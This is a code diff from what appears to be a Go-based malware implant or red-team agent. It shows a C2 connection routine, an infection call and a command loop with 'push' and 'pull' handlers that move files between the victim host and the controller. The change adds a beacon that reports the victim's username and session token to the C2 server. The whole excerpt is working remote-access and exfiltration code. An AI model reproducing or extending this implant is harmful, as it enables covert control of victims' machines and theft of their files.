@@ -34,11 +34,12 @@ func main(){
   infect.Infect(i)
 
   // C2
-  token, sock := connect()
+  token, sock := connect(fmt.Sprintf(":%s", i.GetCurUser()))
   handleCMD(token, sock, i)
 }
 
-func connect()(string, socket.Socket){
+// id: TOKEN:USER 
+func connect(id string)(string, socket.Socket){
   var conn net.Conn
   var err error
   for true {
@@ -51,6 +52,7 @@ func connect()(string, socket.Socket){
   }
 
   sock := socket.Init(conn, config.Key)
+  sock.Write(id)
   token, _ := sock.Read()
 
   debug.Log("T1071", token, "", "Standard Application Layer Protocol")
@@ -63,7 +65,7 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
     cmd, err := sock.Read()
     if err == io.EOF {            // if socket break accidentally (reconnect)
       sock.Close()
-      token, sock = connect()
+      token, sock = connect(fmt.Sprintf("%s:%s", token, i.GetCurUser()))
     }
 
     switch strings.Split(cmd, " ")[0] {
@@ -78,7 +80,7 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
       cmds := strings.Split(cmd, "push")
       cmds[1] = strings.TrimSpace(cmds[1])
 
-      ftoken, fconn := connect()
+      ftoken, fconn := connect(fmt.Sprintf(":%s", i.GetCurUser()))
       sock.Write(ftoken)
       if err = fconn.RecvFile(cmds[1]); err != nil {
 	sock.Write(fmt.Sprintf("%v", err))
@@ -93,7 +95,7 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
       cmds := strings.Split(cmd, "pull")
       cmds[1] = strings.TrimSpace(cmds[1])
 
-      ftoken, fconn := connect()
+      ftoken, fconn := connect(fmt.Sprintf(":%s", i.GetCurUser()))
       sock.Write(ftoken)
       if err = fconn.SendFile(cmds[1]); err != nil {
 	sock.Write(fmt.Sprintf("%v", err))
